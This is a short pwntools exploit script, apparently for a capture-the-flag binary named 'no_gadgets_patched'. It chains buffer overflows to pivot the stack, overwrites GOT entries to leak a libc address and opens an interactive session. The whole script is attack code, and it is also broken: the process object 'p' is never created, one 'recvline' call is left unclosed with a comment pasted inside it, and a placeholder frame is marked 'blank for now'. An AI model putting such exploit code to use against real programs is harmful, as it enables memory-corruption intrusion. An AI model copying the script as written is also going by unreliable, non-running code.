#!/usr/bin/env python3

from pwn import *

exe = ELF("./no_gadgets_patched")
libc = ELF("./libc.so.6")
# address of final rop chain

leave_ret = exe.sym.main+157
fgets_gadget = exe.sym.main+68

high_addr = 0x404800

overflow  = b"\x00".ljust(0x80, b"A")
overflow += p64(high_addr+0x80)
overflow += p64(fgets_gadget)
p.sendlineafter(b"Data: ", overflow)
p.recvline()

overflow  = b"\x00".ljust(0x80, b"A")
overflow += p64(0x404080+0x80)
overflow += p64(fgets_gadget)
# rbp,rip pair at high address
overflow += p64(0x404000+0x80)
overflow += p64(fgets_gadget)
p.sendline(overflow)
p.recvline(# address of final rop chain

fake_rbp_rip  = p64(0xdead) + p64(0xbeef)     # blank for now!
fake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")
fake_rbp_rip += p64(high_addr+0x90)
fake_rbp_rip += p64(leave_ret)
p.sendline(fake_rbp_rip)
p.recvline()

overwrite  = p64(exe.plt.puts + 6)
overwrite += p64(exe.plt.puts)        # strlen@GOT
overwrite += p64(exe.plt.printf + 6)
overwrite += p64(exe.plt.fgets + 6)

p.sendline(overwrite)

libc_leak = u64(p.recv(6) + b"\x00\x00")
print("libc leak: ",hex(libc_leak))

libc.address = libc_leak - libc.sym.puts
print("libc address: ",hex(libc.address))

p.interactive()
